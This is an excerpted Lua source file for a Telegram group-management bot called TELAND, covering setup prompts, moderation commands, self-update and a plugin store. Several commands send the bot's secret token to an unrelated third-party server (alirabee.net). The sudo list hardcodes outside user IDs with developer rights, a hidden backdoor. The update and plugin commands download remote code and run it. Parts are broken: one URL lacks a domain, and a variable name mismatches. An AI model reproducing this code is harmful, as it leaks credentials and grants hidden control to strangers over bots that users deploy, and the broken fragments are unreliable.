...
if not f then   
if not database:get(Server_Done.."Token_Devbot") then
...
database:set(Server_Done.."Token_Devbot",token)
database:set(Server_Done.."Token_Devbotuser",User_Info_bot.result.username)
end 
else
io.write('\n\27[1;31mToken was not saved \n لم يتم حفظ التوكن \n\27[0;39;49m')
end 
os.execute('lua TELAND.lua')
end
---------------------------سري ---------------------------------------------------------------------------------
if not database:get(Server_Done.."Id_Devbotsid") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na------------------------------------\n\27[0;33;49m')
local SUDOID = io.read()
if SUDOID ~= '' then
io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na------------------------------------\n27[0;39;49m')
database:set(Server_Done.."Id_Devbotsid",SUDOID)
else
io.write('\27[0;31m------------------------------------\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end 
os.execute('lua TELAND.lua')
end
if not database:get(Server_Done.."User_Devbots1") then
io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
local SUDOUSERNAME = io.read():gsub('@','')
if SUDOUSERNAME ~= '' then
io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
database:set(Server_Done.."User_Devbots1",SUDOUSERNAME)
...
------------------------------------------------------------------------------------------------------------
local Dev_Info_Sudo = io.open("Info.lua", 'w')
Dev_Info_Sudo:write([[
do 
local File_Info = {
id_dev = ]]..database:get(Server_Done.."Id_Devbotsid")..[[,
UserName_dev = "]]..database:get(Server_Done.."User_Devbots1")..[[",
Userbot = "]]..database:get(Server_Done.."Token_Devbotuser")..[[",
Token_Bot = "]]..database:get(Server_Done.."Token_Devbot")..[["
}
return File_Info
end
...
Dev_Info_Sudo:close()
local Run_File_TELAND = io.open("TELAND", 'w')
Run_File_TELAND:write([[
#!/usr/bin/env bash
cd $HOME/TELAND

token="]]..database:get(Server_Done.."Token_Devbot")..[["
while(true) do
rm -fr ../.telegram-cli
./tg -s ./TELAND.lua -p PROFILE --bot=$token
done
]])
Run_File_TELAND:close()
------------------------------------------------------------------------------------------------------------
...
f:close()  
database:del(Server_Done.."Token_Devbot");database:del(Server_Done.."Id_Devbotsid");database:del(Server_Done.."User_Devbots1")
Status = false
end  
return Status
end
...
SUDO = tonumber(sudos.id_dev)
sudo_users = {SUDO,1787429259,1787429259,1624030710,1756511631,1869163387}   
BotUser = sudos.Userbot
...
if tonumber(user_id) == tonumber(1859346570) then  
var = 'بويكا التاني'
elseif tonumber(user_id) == tonumber(1787429259) then
var = 'مطور السورس'
elseif tonumber(user_id) == tonumber(1624030710) then
var = 'مطور السورس'
elseif tonumber(user_id) == tonumber(1756511631) then
var = '〈 حبيب الكل 〉'
elseif tonumber(user_id) == tonumber(1869163387) then
...
local UserName = (data.username_ or "shgab0")
...
os.execute("cd library && wget https://raw.githubusercontent.com/shgab0/TELAND/main/library/redis.lua") 
os.execute('cd ..')
os.execute('rm -rf TELAND.lua')
os.execute('wget https://raw.githubusercontent.com/shgab0/TELAND/main/TELAND.lua')
send(msg.chat_id_, msg.id_,' *⌯︙تم تحديث السورس* \n*⌯︙لديك اخر اصدار لسورس شغب*\n*⌯︙الاصدار » { 2.8v}*')
dofile('TELAND.lua')  
end
if text == 'الاصدار ⌯' and DevTELANDW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' *⌯︙اصدار سورس شغب* \n*⌯︙الاصدار »{ 2.8v}*')
end
if text == 'قناه تحديثات البوت ⌯' and DevTELANDW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ⌯︙[تحديثات البوت](t.me/shgab0) \n⌯︙[قناه السورس](t.me/shgab0)')
end
...
usertext = '*\n ⌯︙اسم المستخدم »* ['..result.title_..'](t.me/'..(username or 'shgab0')..')'
status  = '\n *⌯︙تم ترقيته مطور*'
...
usertext = '\n *⌯︙اسم المستخدم »* ['..data.first_name_..'](t.me/'..(data.username_ or 'shgab0')..')'
status  = '\n*⌯︙تم ترقيته مطور*'
...
if TELAND1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⌯︙اسم المستخدم »* ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'shgab0')..') \n ⌯︙'..TELAND1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end,nil)
end
...
send(msg.chat_id_,0," *⌯︙العضو :* {["..data.first_name_.."](T.ME/shgab0)}\n⌯︙["..TELAND_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
...
send(msg.chat_id_,0, " *⌯︙عذرا ↫* {["..data.first_name_.."](T.ME/shgab0)}\n*⌯︙عذرا تم منع الملصق* \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:set(bot_id.."TELAND:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
  ...
  if text == 'سورس شغب' or text == 'حرنكش' or text == 'تيست' then
local Text = [[
test
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'اضف البوت لمجموعتك', url="https://t.me/"..BotUser.."?startgroup=new"}},
{{text = 'مطور البوت', url="https://t.me/"..UserName_Dev}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Text)..'&photo='..'https://t.me/Source_Queen&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
  if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
  local Text = [[
  [ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sᴏᴜʀᴄᴇ sʜɢᴀʙ ま](t.me/shgab0) 
  
  ]]
  keyboard = {} 
  keyboard.inline_keyboard = {
  {{text = 'بويكا التاني',url="t.me/ha_rr_y_ha_ma"},{text = 'عجوستا',url="t.me/W_ss_ta"}},
  {{text = 'فرواله المجره', url="t.me/M_o_o_n_12"}},
  {{text = 'قناه السورس', url="t.me/shgab0"}},
  {{text = 'اضف البوت لمجموعتك', url="https://t.me/"..BotUser.."?startgroup=new"}},
{{text = 'مطور البوت', url="https://t.me/"..UserName_Dev}},
}
  local msg_id = msg.id_/2097152/0.5
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'شغب')
local DRAGON_Msg = {
...
send(msg.chat_id_, msg.id_, '*⌯︙بواسطه* » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'shgab0')..') \n*⌯︙تم تفعيل التنظيف التلقائي* ')
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⌯︙بواسطه »* ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'shgab0')..') \n*⌯︙تـم قفـل التاك بالكتم* ')
end,nil)   
...
if DevTELANDW(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/shgab0/Files_Teland/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n *⌯︙اهلا بك في متجر ملفات شغب*\n*⌯︙ملفات السورس ↓*\n*•━━━━━━ SB━━━━━━━•*\n\n"
local TextE = "\n*•━━━━━━ SB━━━━━━━•*\n *⌯︙علامة تعني { ✓ } ملف مفعل*\n *⌯︙علامة تعني { ✘ } ملف معطل*\n *⌯︙قناة سورس شغب ↓*\n".." *⌯︙*[اضغط هنا لدخول](t.me/shgab0) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/shgab0/Files_Teland/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('TELAND.lua')  
else
send(msg.chat_id_, msg.id_," *⌯︙عذرا الملف لايدعم سورس شغب* \n") 
end
return false
end
...
local UserName = (b.username_ or "shgab0")
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⌯︙العضو* » ['..data.first_name_..'](t.me/'..(data.username_ or 'shgab0')..')'
status  = '\n*⌯︙تم ترقيته ادمن*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⌯︙لعضو »* ['..data.first_name_..'](t.me/'..(data.username_ or 'shgab0')..')'
status  = '\n*⌯︙تم تنزيله من المميزين*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⌯︙اسم المستخدم »* '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⌯︙العضــو »* ['..data.first_name_..'](t.me/'..(data.username_ or 'shgab0')..')'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n *⌯︙اسم المستخدم »* ['..result.title_..'](t.me/'..(text1[3] or 'shgab0')..')'..'\n*⌯︙تم رفعه '..text1[2]..'*')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'اضف رد عام' and DevTELANDW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'مسح رد للكل' and DevTELANDW(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'shgab0')..')'
local iduser = result.sender_user_id_
...
{{text = '𝑇𝐸𝐿𝐴𝑁𝐷 𝑇𝐸𝐴𝑀', url="t.me/shgab0"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
zh = https.request('https://alirabee/Apizakrafa.php?text='..URL.escape(TextZhrfa)..'&br='..token..'')
zx = JSON.decode(zh)
t = "\n*⌯︙قائمه الزخرفه* \nٴ⌯∫ٴ*•━━━━━━ SB━━━━━━━•*ٴ⌯∫○ٴ \n"
i = 0
for k,v in pairs(Zrf.ok.QN) do
i = i + 1
t = t..i.."-  "..v.." \n"
end
send(msg.chat_id_, msg.id_, t..'ٴ⌯∫ٴ*•━━━━━━ SB━━━━━━━•*ٴ⌯∫○ٴ\n⌯︙[𝑇𝐸𝐿𝐴𝑁𝐷 𝑇𝐸𝐴𝑀](t.me/shgab0) ')
end
...
gk = https.request('https://alirabee.net/Apibr.php?br='..token..'&text='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
t = br.ok
send(msg.chat_id_, msg.id_, t)
end
...
ge = https.request('https://alirabee.net/Age.php?t='..token..'&Age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
t = ag.Age.QN
send(msg.chat_id_, msg.id_, t)
end
...
inline = {
{{text = 'sᴏᴜʀᴄʀ ᴛᴇʟᴀɴᴅ',url='http://t.me/shgab0'}},
}
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'شغب')
